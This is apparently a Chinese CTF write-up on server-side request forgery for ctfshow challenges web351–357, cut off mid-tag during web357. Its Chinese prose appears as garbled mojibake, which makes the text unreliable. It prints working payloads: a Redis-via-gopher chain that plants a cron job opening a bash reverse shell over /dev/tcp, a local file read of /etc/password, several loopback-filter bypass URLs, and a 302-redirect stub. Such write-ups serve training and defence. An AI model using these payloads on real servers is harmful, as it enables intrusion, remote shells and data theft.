        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><img src="begin.png" loading="lazy"></p><p>SSRF (å…¨ç§°ï¼šServer-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><p>å¦‚å›¾ï¼Œæ”»å‡»è€…ä»å¤–ç½‘é€šè¿‡ SSRF æ”»å‡»è®¿é—®åˆ°å†…ç½‘ï¼Œæ¥ç€å¯¹å†…ç½‘çš„åº”ç”¨å±•å¼€æ”»å‡»ï¼Œè¿™äº›åº”ç”¨åŒ…æ‹¬ä½†ä¸é™äº MySQLï¼Œredisï¼ŒSMTP ç­‰ç­‰ â€¦â€¦</p><p>æ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®š URL åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</p><h4 id="SSRF-çš„åˆ©ç”¨æ–¹å¼"><a href="#SSRF-çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="SSRF çš„åˆ©ç”¨æ–¹å¼"></a>SSRF çš„åˆ©ç”¨æ–¹å¼</h4><p>SSRF åˆ©ç”¨ç›¸å…³çš„å±é™©å‡½æ•°ï¼›SSRF å¯åˆ©ç”¨çš„åè®®æ“ä½œ</p><h5 id="file-get-contents-ä¸-readfile"><a href="#file-get-contents-ä¸-readfile" class="headerlink" title="file_get_contents() ä¸ readfile()"></a><strong>file_get_contents() ä¸ readfile()</strong></h5><ul><li><code>file_get_contents</code>è¿™ä¸€å‡½æ•°æ˜¯æŠŠ **ä¼ å…¥çš„å‚æ•°(å˜é‡)**å†™å…¥å­—ç¬¦ä¸²ï¼Œå½“æŠŠ <strong>ä¼ å‚</strong>æ˜¯å†…ç½‘æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆå»å§è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»å‡ºæ¥å†å†™å…¥ï¼Œå¯¼è‡´äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¹Ÿå°±æ˜¯ä¿¡æ¯æ³„éœ²çš„ä¸€ç§ã€‚ä¸€èˆ¬è¿™ç§æ”»å‡»ä¹Ÿä¸ç›®å½•éå†ç›¸ç»“åˆã€‚</li></ul><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><strong>fsockopen()</strong></h5><ul><li><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>ç”¨äºæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ª Unix å¥—æ¥å­—è¿æ¥ï¼Œåˆå§‹åŒ–ä¸€ä¸ªå¥—æ¥å­—è¿æ¥åˆ°æŒ‡å®šä¸»æœºï¼ˆhostnameï¼‰ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®š url æ•°æ®çš„è·å–ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨ socket è·ŸæœåŠ¡å™¨å»ºç«‹ tcp è¿æ¥ï¼Œè¿›è¡Œä¼ è¾“åŸå§‹æ•°æ®ã€‚ fsockopen() å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨<code>ï¼ˆä¾‹å¦‚ï¼šfgets()ï¼Œfgetss()ï¼Œfwrite()ï¼Œfclose()è¿˜æœ‰feof()ï¼‰</code>å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå°†è¿”å›falseã€‚</li></ul><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h5><ul><li>curl_init(url) å‡½æ•°åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ª cURL å¥æŸ„ï¼Œä¾›<code>curl_setopt()ï¼Œcurl_exec()å’Œcurl_close()</code>å‡½æ•°ä½¿ç”¨ã€‚</li></ul><h5 id="file-åè®®çš„åˆ©ç”¨"><a href="#file-åè®®çš„åˆ©ç”¨" class="headerlink" title="file åè®®çš„åˆ©ç”¨"></a><strong>file åè®®çš„åˆ©ç”¨</strong></h5><pre class="language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/password  # file:// ä¹‹åå¯ä»¥æ¥ä»»æ„æ–‡ä»¶</span></code></pre><h5 id="dict-åè®®çš„ä½¿ç”¨"><a href="#dict-åè®®çš„ä½¿ç”¨" class="headerlink" title="dict åè®®çš„ä½¿ç”¨"></a><strong>dict åè®®çš„ä½¿ç”¨</strong></h5><pre class="language-php" data-language="php"><code class="language-php">åˆ©ç”¨dictåè®®ï¼Œdict<span class="token punctuation">:</span><span class="token comment">//ip/info å¯è·å–æœ¬åœ°redisæœåŠ¡é…ç½®ä¿¡æ¯ã€‚</span></code></pre><h5 id="gopher-åè®®çš„ä½¿ç”¨"><a href="#gopher-åè®®çš„ä½¿ç”¨" class="headerlink" title="gopher åè®®çš„ä½¿ç”¨"></a><strong>gopher åè®®çš„ä½¿ç”¨</strong></h5><p>é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹é€šå¸¸æ”»å‡» Redis çš„å‘½ä»¤ï¼Œç„¶åè½¬åŒ–ä¸º Gopher å¯ç”¨çš„åè®®</p><pre class="language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> flushall<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token operator">|</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> <span class="token number">1</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> dbfilename rootredis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> save//redis-cliæŸ¥çœ‹æ‰€æœ‰çš„keysåŠæ¸…ç©ºæ‰€æœ‰çš„æ•°æ®</code></pre><p>è¿™ä¾¿æ˜¯å¸¸è§çš„expï¼Œåªéœ€è‡ªå·±æ›´æ”¹IPå’Œç«¯å£å³å¯ï¼Œæ”¹æˆé€‚é…äº<code>Gopher</code>åè®®çš„ URLï¼š</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span></code></pre><p>ç»è¿‡urlè§£ç ä¾¿æ˜¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">gopher://127.0.0.1:6379/_*1 <span class="token variable">$8</span> flushall *3 <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> <span class="token number">1</span> <span class="token variable">$64</span> */1 * * * * <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/127.0.0.1/45952 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span> *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$3</span> <span class="token function">dir</span> <span class="token variable">$16</span> /var/www/html/ *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$10</span> dbfilename <span class="token variable">$4</span> root *1 <span class="token variable">$4</span> save quit</code></pre><h3 id="web351-360"><a href="#web351-360" class="headerlink" title="web351-360"></a>web351-360</h3><h4 id="web351-curl-exec"><a href="#web351-curl-exec" class="headerlink" title="web351(curl_exec)"></a>web351(curl_exec)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><ol><li><code>$ch=curl_init($url);</code>ï¼šè¿™è¡Œä»£ç åˆå§‹åŒ–cURLä¼šè¯ï¼Œå¹¶å°†å˜é‡<code>$url</code>ä½œä¸ºè¦è¯·æ±‚çš„URLã€‚</li><li><code>curl_setopt($ch, CURLOPT_HEADER, 0);</code>ï¼šè®¾ç½®cURLé€‰é¡¹ï¼Œå‘Šè¯‰cURLä¸è¦åœ¨è¾“å‡ºä¸­åŒ…å«HTTPå¤´ä¿¡æ¯ã€‚</li><li><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>ï¼šè®¾ç½®cURLé€‰é¡¹ï¼Œä½¿å¾—æ‰§è¡Œ<code>curl_exec</code>åè¿”å›çš„ä¸æ˜¯ç›´æ¥è¾“å‡ºï¼Œè€Œæ˜¯å°†ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</li><li><code>$result=curl_exec($ch);</code>ï¼šæ‰§è¡ŒcURLä¼šè¯ï¼Œå¹¶è·å–ç»“æœï¼Œå­˜å‚¨åœ¨å˜é‡<code>$result</code>ä¸­ã€‚</li><li><code>curl_close($ch);</code>ï¼šå…³é—­cURLä¼šè¯ï¼Œé‡Šæ”¾èµ„æºã€‚</li></ol><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//localhost/flag.php</span>  url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///var/www/html/flag.php</span></code></pre><h4 id="web352-localhost-127-0-0-1ç»•è¿‡"><a href="#web352-localhost-127-0-0-1ç»•è¿‡" class="headerlink" title="web352(localhost|127.0.0.1ç»•è¿‡)"></a>web352(localhost|127.0.0.1ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> hacker</code></pre><p>å¾—æœ‰<code>http|https</code>ä½†æ˜¯banäº†<code>localhost|127.0.0</code>(å¹½é»˜è¿‡æ»¤ï¼Œåé¢æ²¡æœ‰1ï¼Œæ‰€ä»¥ä¹‹å‰payloadä¹Ÿå¯ä»¥)</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">åå…­è¿›åˆ¶url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F.0.0.1/flag.php</span>å…«è¿›åˆ¶url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0177.0.0.1/flag.php</span><span class="token number">10</span> è¿›åˆ¶æ•´æ•°æ ¼å¼url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2130706433/flag.php</span><span class="token number">16</span> è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£ä¸ªç½‘ç«™è½¬æ¢è®°å¾—å‰ç¼€<span class="token number">0</span>xurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0x7F000001/flag.php</span>è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„çœç•¥æ¨¡å¼<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>å†™æˆ<span class="token number">127.1</span>ç”¨<span class="token constant">CIDR</span>ç»•è¿‡localhosturl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.127.127.127/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0.0.0.0/flag.php</span>payloadï¼šurl<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><p>è¡¥å……ä¸€ç‚¹</p><p><code>parse_url</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè§£æä¸€ä¸ª URL å¹¶è¿”å›å…¶ç»„æˆéƒ¨åˆ†ä½œä¸ºæ•°ç»„ã€‚è¿™ä¸ªå‡½æ•°éå¸¸é€‚ç”¨äºéœ€è¦ä» URL ä¸­æå–åè®®ã€ä¸»æœºåã€è·¯å¾„ç­‰ä¿¡æ¯çš„åœºæ™¯ã€‚</p><p><strong>å‡½æ•°åŸå‹</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$component</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span></code></pre><p><strong>å‚æ•°</strong></p><ul><li><p><code>$url</code>ï¼šéœ€è¦è§£æçš„ URL å­—ç¬¦ä¸²ã€‚</p></li><li><p><code>$component</code>ï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šè¿”å› URL çš„å“ªä¸ªéƒ¨åˆ†ã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€ï¼š</p><ul><li><code>PHP_URL_SCHEME</code>ï¼šè¿”å› URL çš„åè®®éƒ¨åˆ†ï¼ˆå¦‚ <code>http</code>, <code>https</code>ï¼‰ã€‚</li><li><code>PHP_URL_HOST</code>ï¼šè¿”å› URL çš„ä¸»æœºéƒ¨åˆ†ï¼ˆå¦‚ <code>www.example.com</code>ï¼‰ã€‚</li><li><code>PHP_URL_PORT</code>ï¼šè¿”å› URL çš„ç«¯å£éƒ¨åˆ†ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li><li><code>PHP_URL_USER</code>ï¼šè¿”å› URL çš„ç”¨æˆ·åéƒ¨åˆ†ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li><li><code>PHP_URL_PASS</code>ï¼šè¿”å› URL çš„å¯†ç éƒ¨åˆ†ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li><li><code>PHP_URL_PATH</code>ï¼šè¿”å› URL çš„è·¯å¾„éƒ¨åˆ†ï¼ˆå¦‚ <code>/path/to/resource</code>ï¼‰ã€‚</li><li><code>PHP_URL_QUERY</code>ï¼šè¿”å› URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li><li><code>PHP_URL_FRAGMENT</code>ï¼šè¿”å› URL çš„ç‰‡æ®µæ ‡è¯†ç¬¦éƒ¨åˆ†ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li></ul><p>å¦‚æœçœç•¥æ­¤å‚æ•°æˆ–è®¾ç½®ä¸º <code>-1</code>ï¼Œ<code>parse_url</code> å°†è¿”å›åŒ…å«æ‰€æœ‰éƒ¨åˆ†çš„æ•°ç»„ã€‚</p></li></ul><p><strong>è¿”å›å€¼</strong></p><ul><li>å¦‚æœæˆåŠŸï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…æ‹¬ URL çš„å„ä¸ªç»„æˆéƒ¨åˆ†ã€‚</li><li>å¦‚æœ URL æ ¼å¼ä¸æ­£ç¡®æˆ–æ— æ³•è§£æï¼Œè¿”å› <code>false</code>ã€‚</li></ul><h4 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\ã€‚/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¤šè¿‡æ»¤äº†å¥å·ï¼Œä¸Šé¢˜Payloadä¹Ÿå¯ä»¥</p><h4 id="web354-è§£æåŸŸå"><a href="#web354-è§£æåŸŸå" class="headerlink" title="web354(è§£æåŸŸå)"></a>web354(è§£æåŸŸå)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|1|0|ã€‚/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>1å’Œ0è¿‡æ»¤äº†</p><p>302è·³è½¬ï¼Œvpsæ­ä¸€ä¸ª :</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>POST: url&#x3D;<a href="http://your-domain/ssrf/302.php">http://your-domain/ssrf/302.php</a><br>Y4å¸ˆå‚…æ‰¾åˆ°ä¸€ä¸ªAè®°å½•æ˜¯127.0.0.1çš„ç½‘ç«™: <a href="http://sudo.cc/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%94%A8%E8%A7%A3%E6%9E%90%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%86">http://sudo.cc/ï¼Œå¯ä»¥ä¸ç”¨è§£æè‡ªå·±çš„äº†</a><br>payload:url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h4 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ²¡æœ‰åšå…¶ä»–è¿‡æ»¤ï¼Œä½†é™åˆ¶äº†<code>host</code>çš„é•¿åº¦</p><p>0åœ¨linuxç³»ç»Ÿä¸­ä¼šè§£ææˆ127.0.0.1åœ¨windowsä¸­è§£ææˆ0.0.0.0</p><p>Payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span>  url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//127.1/flag.php</span></code></pre><h4 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//0/flag.php</span></code></pre><h4 id="web357-é‡å®šå‘"><a href="#web357-é‡å®šå‘" class="headerlink" title="web357(é‡å®šå‘)"></a>web357(é‡å®šå‘)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span 